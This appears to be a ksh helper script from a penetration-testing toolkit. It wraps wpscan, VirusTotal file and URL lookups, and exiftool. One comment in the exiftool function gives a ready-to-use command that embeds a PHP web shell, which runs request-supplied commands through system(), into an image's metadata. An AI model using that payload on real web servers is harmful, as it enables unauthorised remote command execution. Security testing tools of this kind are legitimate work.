#!/usr/bin/env ksh
# -*- coding: utf-8 -*-


function wpvulndb::validate {
    if [ -z "${WPVULNDB_API_TOKEN}" ]; then
        message_warning "WPVULNDB_API_TOKEN is necessary"
        return 0
    fi
}

function file::validate {
    if [ -z "${VIRUSTOTAL_API_KEY}" ]; then
        message_warning "VIRUSTOTAL_API_KEY is necessary"
        return 0
    fi
}

function wpscan {
    hacker::docker::run -i wpscanteam/wpscan "${@}" --api-token "${WPVULNDB_API_TOKEN}"
}

function filereport {
    local filename
    hacker::file::validate
    filename="${1}"
    http GET https://www.virustotal.com/vtapi/v2/file/report \
         apikey=="${VIRUSTOTAL_API_KEY}" resource=="${filename}"
}

function filescan {
    local filename
    hacker::file::validate
    filename="${1}"
    http -f POST https://www.virustotal.com/vtapi/v2/file/scan \
         apikey=="${VIRUSTOTAL_API_KEY}" file==@"${filename}"
}

function filerescan {
    local filename
    hacker::file::validate
    filename="${1}"
    http POST https://www.virustotal.com/vtapi/v2/file/rescan \
         apikey=="${VIRUSTOTAL_API_KEY}" resource=="${filename}"
}

function exiftool {
    # code php -DocumentName="<h1>SLOVACUS<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.jpg
    hacker::docker::run -v "${PWD}":/root/pub v4tech/exiftool \
           exiftool "${@}"
}

function urls::validate {
    if [ -z "${VIRUSTOTAL_API_KEY}" ]; then
        message_warning "VIRUSTOTAL_API_KEY is necessary"
        return 0
    fi
}

function urlreport {
    local url
    hacker::urls::validate
    url="${1}"
    http GET https://www.virustotal.com/vtapi/v2/url/report \
         apikey=="${VIRUSTOTAL_API_KEY}" resource=="${url}"
}
